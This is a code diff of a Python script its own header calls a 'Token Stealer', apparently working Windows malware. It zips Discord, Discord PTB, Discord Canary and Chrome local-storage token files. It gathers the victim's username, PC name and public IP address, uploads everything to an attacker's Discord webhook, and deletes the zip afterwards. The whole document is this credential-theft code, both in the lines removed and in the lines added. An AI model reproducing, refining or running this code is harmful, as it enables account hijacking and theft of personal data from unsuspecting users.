@@ -1,76 +1,104 @@
 # 1-28-19
 # Project: Token Stealer
-# Authors: Blakeando10 | Synchronocy
+# Authors: DeadBread76 | Synchronocy
 # IDLE 3.6.5 (32/64)
 # Essentially uhh. no comment.
 # requirements as follows.
 
-from dhooks import Webhook, File # we can supply this so we can use local file instead of downloading it
 import os
-import requests
+import sys
 import shutil
-from io import BytesIO
-dia = 1
+import zipfile
+from requests import get
+from hurry.filesize import size,alternative
+from dhooks import Webhook, File
+
+hook = Webhook('WEBHOOK HERE')
 path = os.getenv('APPDATA')
-tempzipdir = os.getenv('LOCALAPPDATA')+"\\temp\\"+"logs.zip"
-userinfo = ''
-leveldbdir = "\\discord\\Local Storage\\"
-discordloc = leveldbdir+'leveldb\\' 
-tokendir = str(path)+str(discordloc)
-hook = Webhook('WEBHOOK_LINK_HERE')
-logfile = []
-zipf = 'lol.zip'
+localpath = os.getenv('LOCALAPPDATA')
+user = os.getenv('username')
+pc_name = os.environ['COMPUTERNAME']
+temp_dir = localpath+"\\temp\\"
+tokendir = path+"\\Discord\\Local Storage\\leveldb\\"
+ptbtokendir = path+"\\discordptb\\Local Storage\\leveldb\\"
+canarytokendir = path+"\\discordcanary\\Local Storage\\leveldb\\"
+chromedir = localpath + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\"
 
-def getinfo():
-  src = requests.get('http://checkip.dyndns.org/').text 
-  src = '''*** '''+src[76:].replace('</body></html>','').rstrip()+''' ***'''
-  username = 'Username: '+os.environ['HOME'].strip('C:\\Users\\') 
-  pc_name = 'Computer Name: '+os.environ['COMPUTERNAME']
-  userinfo = '''```'''+str(src)+'\n'+username+'\n'+pc_name+'''```'''
-  return userinfo
+zipf = temp_dir+"logs.zip"
+if os.path.isfile(temp_dir+"run.log"):
+  sys.exit()
+ip = get('https://api.ipify.org').text
 
+if os.path.isfile(zipf):
+  os.remove(zipf)
 
-def getlogfiles():
-  if os.path.isfile(zipf): # our check if we've already dmped 
-    os.remove(zipf)
+zip = zipfile.ZipFile(zipf,'a')
+
+if os.path.isdir(tokendir):
+  discordinst = True
   try:
-    shutil.make_archive('lol', 'zip', tokendir) # create our zip 
+    for root, dirs, files in os.walk(tokendir):
+      for file in files:
+        zip.write(tokendir+file)
+  except Exception:
+    failed = True
+else:
+  discordinst = False
+  
+if os.path.isdir(ptbtokendir):
+  ptbinst = True
+  try:
+     for root, dirs, files in os.walk(ptbtokendir):
+       for file in files:
+         zip.write(ptbtokendir+file)
+  except Exception:
+     ptbfailed = True
+else:
+  ptbinst = False
+  
+if os.path.isdir(canarytokendir):
+  canaryinst = True
+  try:
+     for root, dirs, files in os.walk(canarytokendir):
+       for file in files:
+         zip.write(canarytokendir+file)
+  except Exception:
+     canaryfailed = True
+else:
+  canaryinst = False
+ 
+if os.path.isdir(chromedir):
+  chromeinst = True
+  try:
+     for root, dirs, files in os.walk(chromedir):
+       for file in files:
+         zip.write(chromedir+file)
+  except Exception:
+     chromefailed = True
+else:
+  chromeinst = False
+zip.close()
+
+zipfilesize = size(os.path.getsize(zipf),system=alternative)
+if int(os.path.getsize(zipf)) > 8388608:
+  filetoobig = True
+def main():
+  with open (temp_dir+"run.log", 'w+') as handle:
+    handle.write("Fatal Error.")
+    handle.close()
+  hook.send('```css\nToken Grabbed! \n\nUsername: '+str(user) + '\nPC Name: ' + pc_name + '\nIP Address: {}'.format(ip) + '\n\nZip File size: '+ str(zipfilesize)+'\n\nZip File:```')
+  try:
+    hook.send(file = File(zipf, name=str(user)+" Logs.zip"))
+  except:
+    if filetoobig == True:
+      hook.send('```css\nThe Zip file was too big.```')
+    else:
+      hook.send('```css\nThere was an error obtaining the zip.```')
+  if discordinst and ptbinst and canaryinst and chromeinst == False:
+    hook.send("```css\nUser had nothing installed```")
+  try:
+    os.remove(zipf)
   except:
     return ''
-  print(tokendir)
-  for root, dirs, files in os.walk(tokendir):
-    for file in files:
-      if '.log' in file:
-        logfile.append(file)
-      if '.ldb' in file:
-        logfile.append(file)
-
-        
-def main():
-    getlogfiles()
-    if dia == 1:
-        hook.send('Diagnostics mode initiated!\n')
-        hook.send('Token Directory: '+tokendir)
-        for x in logfile:
-            hook.send('Log File: '+x)
-        hook.send('PC Info: '+getinfo())
-        hook.send('Zip File:', file = File('./'+zipf, name=zipf)) # Remember whatever location this is installed @ it will attempt to save files here and upload.
-    else:
-        for x in logfile:
-            if logfile != '':
-                hook.send('Token Grabbed: '+x)
-                for x in logfile:
-                  hook.send("Log File('s): "+x)
-                hook.send('Zip File:', file = File('./'+zipf, name=zipf)) # Remember whatever location this is installed @ it will attempt to save files here and upload.
-                hook.send('PC Info: '+getinfo())
-            else:
-                hook.send('Failed to grab token.')
-                hook.send('PC Info: '+getinfo())
-    print('Starting Cleanup')
-    try:
-      os.remove(zipf)
-      print('Removed Our zip')
-    except:
-      return ''
 
 main()
